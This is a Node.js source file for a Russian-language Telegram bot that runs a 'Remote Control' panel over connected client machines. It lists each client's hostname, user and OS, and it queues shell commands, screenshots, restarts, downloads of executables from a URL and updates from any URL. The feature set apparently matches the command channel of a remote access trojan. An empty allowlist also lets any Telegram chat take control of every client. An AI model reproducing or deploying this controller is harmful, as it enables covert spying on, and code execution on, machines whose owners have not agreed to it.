const https = require("https");

const TELEGRAM_API_BASE_URL = "https://api.telegram.org";
const TELEGRAM_PAGE_SIZE = 6;
const TELEGRAM_MESSAGE_LIMIT = 3800;
const TELEGRAM_CAPTION_LIMIT = 900;

function normalizeText(value, maxLength = 4000) {
  return String(value || "").trim().slice(0, maxLength);
}

function truncateText(value, maxLength) {
  const text = String(value || "").trim();
  if (text.length <= maxLength) {
    return text;
  }

  return `${text.slice(0, Math.max(0, maxLength - 20)).trimEnd()}\n...[truncated]`;
}

function formatDate(value) {
  if (!value) {
    return "—";
  }

  const date = new Date(value);
  if (Number.isNaN(date.getTime())) {
    return String(value);
  }

  return date.toLocaleString("ru-RU");
}

function parseAllowedChatIds(rawValue) {
  return new Set(
    String(rawValue || "")
      .split(",")
      .map((item) => item.trim())
      .filter(Boolean)
  );
}

function paginate(items, page, pageSize) {
  const totalPages = Math.max(1, Math.ceil(items.length / pageSize));
  const safePage = Math.min(Math.max(Number(page) || 0, 0), totalPages - 1);
  const startIndex = safePage * pageSize;
  return {
    page: safePage,
    totalPages,
    items: items.slice(startIndex, startIndex + pageSize)
  };
}

function createTelegramBot(options) {
  const {
    token,
    publicBaseUrl,
    allowedChatIds,
    appVersion,
    getDashboardData,
    queueCommand,
    renameClient,
    setClientArchived,
    deleteClient,
    queueRestart,
    logAction
  } = options;

  if (!token) {
    return {
      start() {
        logAction("telegram_bot_disabled", {
          reason: "missing_token"
        });
      }
    };
  }

  const allowedChats = parseAllowedChatIds(allowedChatIds);
  const chatState = new Map();
  let nextUpdateOffset = 0;
  let isStarted = false;

  function getState(chatId) {
    const normalizedChatId = String(chatId);
    if (!chatState.has(normalizedChatId)) {
      chatState.set(normalizedChatId, {
        selectedClientId: "",
        pendingInput: null
      });
    }

    return chatState.get(normalizedChatId);
  }

  function isChatAllowed(chatId) {
    return allowedChats.size === 0 || allowedChats.has(String(chatId));
  }

  function getSnapshot() {
    return getDashboardData();
  }

  function getClient(clientId) {
    return getSnapshot().clients.find((client) => client.client_id === clientId) || null;
  }

  function getClientSummary(client) {
    const report = client.latest_report;
    const lines = [
      `Клиент: ${client.display_name}`,
      `ID: ${client.client_id}`,
      `Статус: ${client.is_online ? "online" : "offline"}${client.archived ? " / archived" : ""}`,
      `Последний контакт: ${formatDate(client.last_seen_at)}`,
      `Хост: ${normalizeText(client.system_info?.hostname, 120) || "—"}`,
      `Пользователь: ${normalizeText(client.system_info?.username, 120) || "—"}`,
      `OS: ${normalizeText(client.system_info?.os, 200) || "—"}`,
      `Версия клиента: ${normalizeText(client.system_info?.client_version, 40) || "—"}`,
      `Команд в очереди: ${client.pending_commands || 0}`,
      `Последний отчет: ${report ? formatDate(report.received_at) : "нет"}`
    ];

    if (report?.result) {
      lines.push("");
      lines.push("Превью отчета:");
      lines.push(truncateText(report.result, 700));
    }

    return lines.join("\n");
  }

  function buildHomeMessage() {
    const snapshot = getSnapshot();

    return [
      `Remote Control ${appVersion || "1.0.5"} / Telegram`,
      "",
      `Всего клиентов: ${snapshot.total_clients}`,
      `Онлайн: ${snapshot.online_clients}`,
      `Активные: ${snapshot.active_clients}`,
      `Архив: ${snapshot.archived_clients}`,
      "",
      "Выберите раздел кнопками ниже."
    ].join("\n");
  }

  function buildHomeKeyboard() {
    const snapshot = getSnapshot();

    return {
      inline_keyboard: [
        [
          { text: `Активные (${snapshot.active_clients})`, callback_data: "ls:a:0" },
          { text: `Архив (${snapshot.archived_clients})`, callback_data: "ls:r:0" }
        ],
        [{ text: "Обновить", callback_data: "home" }]
      ]
    };
  }

  function buildClientListMessage(archivedMode, page) {
    const snapshot = getSnapshot();
    const sourceClients = snapshot.clients.filter((client) => Boolean(client.archived) === archivedMode);
    const { items, page: safePage, totalPages } = paginate(sourceClients, page, TELEGRAM_PAGE_SIZE);
    const title = archivedMode ? "Архив клиентов" : "Активные клиенты";

    if (!sourceClients.length) {
      return `${title}\n\nСписок пуст.`;
    }

    const lines = [
      `${title}`,
      `Страница ${safePage + 1} из ${totalPages}`,
      "",
      ...items.map((client, index) => {
        const marker = client.is_online ? "●" : "○";
        return `${index + 1}. ${marker} ${client.display_name}`;
      })
    ];

    return lines.join("\n");
  }

  function buildClientListKeyboard(archivedMode, page) {
    const snapshot = getSnapshot();
    const sourceClients = snapshot.clients.filter((client) => Boolean(client.archived) === archivedMode);
    const { items, page: safePage, totalPages } = paginate(sourceClients, page, TELEGRAM_PAGE_SIZE);
    const keyboard = items.map((client) => [
      {
        text: `${client.is_online ? "●" : "○"} ${client.display_name}`,
        callback_data: `cl:${client.client_id}`
      }
    ]);

    const navigationRow = [];
    if (safePage > 0) {
      navigationRow.push({
        text: "← Назад",
        callback_data: `ls:${archivedMode ? "r" : "a"}:${safePage - 1}`
      });
    }
    if (safePage < totalPages - 1) {
      navigationRow.push({
        text: "Вперед →",
        callback_data: `ls:${archivedMode ? "r" : "a"}:${safePage + 1}`
      });
    }
    if (navigationRow.length) {
      keyboard.push(navigationRow);
    }

    keyboard.push([{ text: "Домой", callback_data: "home" }]);

    return { inline_keyboard: keyboard };
  }

  function buildClientKeyboard(client) {
    return {
      inline_keyboard: [
        [
          { text: "Скриншот", callback_data: `do:sc:${client.client_id}` },
          { text: "Отчет", callback_data: `do:rp:${client.client_id}` }
        ],
        [
          { text: "Shell", callback_data: `ask:sh:${client.client_id}` },
          { text: "Restart", callback_data: `do:rs:${client.client_id}` }
        ],
        [
          { text: "Rename", callback_data: `ask:rn:${client.client_id}` },
          { text: "Update", callback_data: `ask:up:${client.client_id}` }
        ],
        [
          { text: "Download", callback_data: `ask:dw:${client.client_id}` },
          { text: client.archived ? "Вернуть" : "В архив", callback_data: `do:ar:${client.client_id}` }
        ],
        [{ text: "Удалить клиента", callback_data: `cf:del:${client.client_id}` }],
        [
          { text: "Назад", callback_data: `ls:${client.archived ? "r" : "a"}:0` },
          { text: "Обновить", callback_data: `cl:${client.client_id}` }
        ]
      ]
    };
  }

  function buildDeleteConfirmKeyboard(clientId) {
    return {
      inline_keyboard: [
        [
          { text: "Да, удалить", callback_data: `do:del:${clientId}` },
          { text: "Отмена", callback_data: `cl:${clientId}` }
        ]
      ]
    };
  }

  function sendApiRequest(method, payload = {}) {
    const requestBody = JSON.stringify(payload);

    return new Promise((resolve, reject) => {
      const request = https.request(
        `${TELEGRAM_API_BASE_URL}/bot${token}/${method}`,
        {
          method: "POST",
          headers: {
            "Content-Type": "application/json",
            "Content-Length": Buffer.byteLength(requestBody)
          }
        },
        (response) => {
          let responseBody = "";

          response.setEncoding("utf8");
          response.on("data", (chunk) => {
            responseBody += chunk;
          });
          response.on("end", () => {
            try {
              const parsed = JSON.parse(responseBody || "{}");
              if (response.statusCode >= 400 || !parsed.ok) {
                return reject(
                  new Error(parsed.description || `Telegram API request failed with status ${response.statusCode}`)
                );
              }

              return resolve(parsed.result);
            } catch (error) {
              return reject(error);
            }
          });
        }
      );

      request.setTimeout(45_000, () => {
        request.destroy(new Error(`Telegram API timeout on ${method}`));
      });
      request.on("error", reject);
      request.write(requestBody);
      request.end();
    });
  }

  async function answerCallbackQuery(callbackQueryId, text) {
    try {
      await sendApiRequest("answerCallbackQuery", {
        callback_query_id: callbackQueryId,
        text: normalizeText(text, 180) || "OK"
      });
    } catch (error) {
      logAction("telegram_callback_answer_failed", {
        message: error.message
      });
    }
  }

  async function upsertMenuMessage(chatId, text, replyMarkup, messageId) {
    const payload = {
      chat_id: chatId,
      text: truncateText(text, TELEGRAM_MESSAGE_LIMIT),
      reply_markup: replyMarkup
    };

    if (messageId) {
      try {
        return await sendApiRequest("editMessageText", {
          ...payload,
          message_id: messageId
        });
      } catch (error) {
        if (!String(error.message).includes("message is not modified")) {
          throw error;
        }
      }
    }

    return sendApiRequest("sendMessage", payload);
  }

  async function showHome(chatId, messageId) {
    const result = await upsertMenuMessage(chatId, buildHomeMessage(), buildHomeKeyboard(), messageId);
    return result?.message_id || messageId || null;
  }

  async function showClientList(chatId, archivedMode, page, messageId) {
    const result = await upsertMenuMessage(
      chatId,
      buildClientListMessage(archivedMode, page),
      buildClientListKeyboard(archivedMode, page),
      messageId
    );
    return result?.message_id || messageId || null;
  }

  async function showClient(chatId, clientId, messageId) {
    const client = getClient(clientId);
    if (!client) {
      throw new Error("Клиент не найден.");
    }

    const result = await upsertMenuMessage(chatId, getClientSummary(client), buildClientKeyboard(client), messageId);
    return result?.message_id || messageId || null;
  }

  async function showDeleteConfirm(chatId, clientId, messageId) {
    const client = getClient(clientId);
    if (!client) {
      throw new Error("Клиент не найден.");
    }

    const result = await upsertMenuMessage(
      chatId,
      `Удалить клиента ${client.display_name}?\n\nБудут удалены карточка, очередь команд и все отчеты.`,
      buildDeleteConfirmKeyboard(clientId),
      messageId
    );
    return result?.message_id || messageId || null;
  }

  async function sendText(chatId, text, replyMarkup) {
    return sendApiRequest("sendMessage", {
      chat_id: chatId,
      text: truncateText(text, TELEGRAM_MESSAGE_LIMIT),
      reply_markup: replyMarkup,
      disable_web_page_preview: true
    });
  }

  async function sendPhoto(chatId, photoUrl, caption) {
    return sendApiRequest("sendPhoto", {
      chat_id: chatId,
      photo: photoUrl,
      caption: truncateText(caption, TELEGRAM_CAPTION_LIMIT)
    });
  }

  async function sendLatestReport(chatId, clientId) {
    const client = getClient(clientId);
    if (!client) {
      throw new Error("Клиент не найден.");
    }

    const report = client.latest_report;
    if (!report) {
      await sendText(chatId, `У клиента ${client.display_name} пока нет отчетов.`);
      return;
    }

    const reportHeader = [
      `Последний отчет: ${client.display_name}`,
      `Время: ${formatDate(report.received_at)}`,
      `Команда: ${normalizeText(report.display_command || report.command_kind || "manual", 120) || "—"}`,
      ""
    ].join("\n");
    const reportBody = truncateText(report.result || "Пустой отчет.", TELEGRAM_MESSAGE_LIMIT - reportHeader.length - 50);

    if (report.screenshot_url && publicBaseUrl) {
      const normalizedBaseUrl = String(publicBaseUrl).replace(/\/+$/, "");
      await sendPhoto(chatId, `${normalizedBaseUrl}${report.screenshot_url}`, `${reportHeader}${reportBody}`);
      return;
    }

    await sendText(chatId, `${reportHeader}${reportBody}`);
  }

  function beginInput(chatId, clientId, kind) {
    const state = getState(chatId);
    state.selectedClientId = clientId;
    state.pendingInput = { kind, clientId };
  }

  function clearInput(chatId) {
    const state = getState(chatId);
    state.pendingInput = null;
  }

  async function handleInputMessage(chatId, text) {
    const state = getState(chatId);
    const pendingInput = state.pendingInput;

    if (!pendingInput) {
      if (text === "/start" || text === "/menu") {
        await showHome(chatId);
        return;
      }

      if (text === "/cancel") {
        await sendText(chatId, "Активный ввод уже пуст.");
        return;
      }

      await sendText(chatId, "Используйте кнопки меню. Команды ввода начинаются после нажатия Shell / Rename / Download / Update.", buildHomeKeyboard());
      return;
    }

    const client = getClient(pendingInput.clientId);
    if (!client) {
      clearInput(chatId);
      await sendText(chatId, "Выбранный клиент уже удален.");
      return;
    }

    if (text === "/cancel") {
      clearInput(chatId);
      await sendText(chatId, "Ввод отменен.");
      await showClient(chatId, client.client_id);
      return;
    }

    switch (pendingInput.kind) {
      case "rename": {
        const name = normalizeText(text, 120);
        if (!name) {
          await sendText(chatId, "Имя не должно быть пустым. Отправьте новое имя или /cancel.");
          return;
        }

        renameClient(client.client_id, name);
        clearInput(chatId);
        await sendText(chatId, `Имя клиента обновлено: ${name}`);
        await showClient(chatId, client.client_id);
        return;
      }

      case "shell": {
        const command = normalizeText(text, 3500);
        if (!command) {
          await sendText(chatId, "Shell-команда пустая. Отправьте команду или /cancel.");
          return;
        }

        queueCommand(client.client_id, `shell:${command}`, {
          command_kind: "manual",
          display_command: command
        });
        clearInput(chatId);
        await sendText(chatId, `Shell-команда поставлена в очередь для ${client.display_name}.`);
        await showClient(chatId, client.client_id);
        return;
      }

      case "download": {
        const payload = normalizeText(text, 3500);
        if (!payload || !payload.startsWith("http")) {
          await sendText(chatId, "Формат: URL [имя_файла]. Пример: https://site/file.exe setup.exe");
          return;
        }

        queueCommand(client.client_id, `download:${payload}`, {
          command_kind: "manual",
          display_command: `download ${payload}`
        });
        clearInput(chatId);
        await sendText(chatId, `Download-команда поставлена в очередь для ${client.display_name}.`);
        await showClient(chatId, client.client_id);
        return;
      }

      case "update": {
        const updateUrl = normalizeText(text, 2048);
        if (!updateUrl || !updateUrl.startsWith("http")) {
          await sendText(chatId, "Нужен URL вида https://... Отправьте ссылку на обновление или /cancel.");
          return;
        }

        queueCommand(client.client_id, `update:${updateUrl}`, {
          command_kind: "manual",
          display_command: `update ${updateUrl}`
        });
        clearInput(chatId);
        await sendText(chatId, `Update-команда поставлена в очередь для ${client.display_name}.`);
        await showClient(chatId, client.client_id);
        return;
      }

      default:
        clearInput(chatId);
        await sendText(chatId, "Сценарий ввода сброшен. Попробуйте еще раз кнопками.");
    }
  }

  async function handleCallbackQuery(callbackQuery) {
    const chatId = callbackQuery.message?.chat?.id;
    const messageId = callbackQuery.message?.message_id;
    const callbackData = normalizeText(callbackQuery.data, 80);
    const state = getState(chatId);
    state.pendingInput = null;

    if (!chatId || !messageId) {
      await answerCallbackQuery(callbackQuery.id, "Недостаточно данных сообщения.");
      return;
    }

    const parts = callbackData.split(":");
    const scope = parts[0];

    try {
      switch (scope) {
        case "home":
          state.selectedClientId = "";
          await showHome(chatId, messageId);
          await answerCallbackQuery(callbackQuery.id, "Главное меню обновлено.");
          return;

        case "ls": {
          const archivedMode = parts[1] === "r";
          const page = Number.parseInt(parts[2] || "0", 10) || 0;
          state.selectedClientId = "";
          await showClientList(chatId, archivedMode, page, messageId);
          await answerCallbackQuery(callbackQuery.id, "Список клиентов обновлен.");
          return;
        }

        case "cl": {
          const clientId = parts.slice(1).join(":");
          state.selectedClientId = clientId;
          await showClient(chatId, clientId, messageId);
          await answerCallbackQuery(callbackQuery.id, "Карточка клиента обновлена.");
          return;
        }

        case "cf": {
          if (parts[1] === "del") {
            await showDeleteConfirm(chatId, parts[2], messageId);
            await answerCallbackQuery(callbackQuery.id, "Подтвердите удаление.");
            return;
          }
          break;
        }

        case "ask": {
          const action = parts[1];
          const clientId = parts[2];
          const client = getClient(clientId);
          if (!client) {
            throw new Error("Клиент не найден.");
          }

          state.selectedClientId = clientId;
          switch (action) {
            case "sh":
              beginInput(chatId, clientId, "shell");
              await sendText(chatId, `Отправьте shell-команду для ${client.display_name}.\n\nДля отмены: /cancel`);
              break;
            case "rn":
              beginInput(chatId, clientId, "rename");
              await sendText(chatId, `Отправьте новое имя для ${client.display_name}.\n\nДля отмены: /cancel`);
              break;
            case "dw":
              beginInput(chatId, clientId, "download");
              await sendText(chatId, `Отправьте строку в формате:\nURL [имя_файла]\n\nДля отмены: /cancel`);
              break;
            case "up":
              beginInput(chatId, clientId, "update");
              await sendText(chatId, `Отправьте URL для update-команды.\n\nДля отмены: /cancel`);
              break;
            default:
              throw new Error("Неизвестное действие.");
          }

          await answerCallbackQuery(callbackQuery.id, "Ожидаю текстовый ввод.");
          return;
        }

        case "do": {
          const action = parts[1];
          const clientId = parts[2];
          const client = getClient(clientId);
          if (!client) {
            throw new Error("Клиент не найден.");
          }

          state.selectedClientId = clientId;

          switch (action) {
            case "sc":
              queueCommand(clientId, "screenshot", {
                command_kind: "screenshot",
                display_command: "[screenshot]"
              });
              await showClient(chatId, clientId, messageId);
              await answerCallbackQuery(callbackQuery.id, "Скриншот поставлен в очередь.");
              return;

            case "rp":
              await sendLatestReport(chatId, clientId);
              await answerCallbackQuery(callbackQuery.id, "Отчет отправлен.");
              return;

            case "rs":
              queueRestart(clientId);
              await showClient(chatId, clientId, messageId);
              await answerCallbackQuery(callbackQuery.id, "Restart поставлен в очередь.");
              return;

            case "ar":
              setClientArchived(clientId, !client.archived);
              await showClientList(chatId, client.archived, 0, messageId);
              await answerCallbackQuery(callbackQuery.id, client.archived ? "Клиент возвращен из архива." : "Клиент отправлен в архив.");
              return;

            case "del":
              deleteClient(clientId);
              state.selectedClientId = "";
              await showHome(chatId, messageId);
              await answerCallbackQuery(callbackQuery.id, "Клиент удален.");
              return;

            default:
              throw new Error("Неизвестное действие.");
          }
        }

        default:
          throw new Error("Неизвестная callback-команда.");
      }
    } catch (error) {
      await answerCallbackQuery(callbackQuery.id, error.message || "Ошибка Telegram-бота.");
      await sendText(chatId, `Ошибка: ${error.message || "не удалось выполнить действие"}`);
    }
  }

  async function processUpdate(update) {
    if (update.callback_query) {
      const chatId = update.callback_query.message?.chat?.id;

      if (!isChatAllowed(chatId)) {
        await answerCallbackQuery(update.callback_query.id, "Доступ запрещен.");
        return;
      }

      await handleCallbackQuery(update.callback_query);
      return;
    }

    if (!update.message || typeof update.message.text !== "string") {
      return;
    }

    const chatId = update.message.chat?.id;
    if (!isChatAllowed(chatId)) {
      await sendText(chatId, "Этот чат не разрешен для управления ботом.");
      return;
    }

    await handleInputMessage(chatId, update.message.text.trim());
  }

  async function poll() {
    while (isStarted) {
      try {
        const updates = await sendApiRequest("getUpdates", {
          offset: nextUpdateOffset,
          timeout: 25,
          allowed_updates: ["message", "callback_query"]
        });

        for (const update of updates) {
          nextUpdateOffset = update.update_id + 1;
          await processUpdate(update);
        }
      } catch (error) {
        logAction("telegram_poll_error", {
          message: error.message
        });
        await new Promise((resolve) => setTimeout(resolve, 5000));
      }
    }
  }

  return {
    async start() {
      if (isStarted) {
        return;
      }

      isStarted = true;

      try {
        await sendApiRequest("deleteWebhook", {
          drop_pending_updates: false
        });
        logAction("telegram_bot_started", {
          version: appVersion || "1.0.5"
        });
      } catch (error) {
        logAction("telegram_bot_start_failed", {
          message: error.message
        });
      }

      poll().catch((error) => {
        logAction("telegram_bot_crashed", {
          message: error.message
        });
      });
    }
  };
}

module.exports = {
  createTelegramBot
};
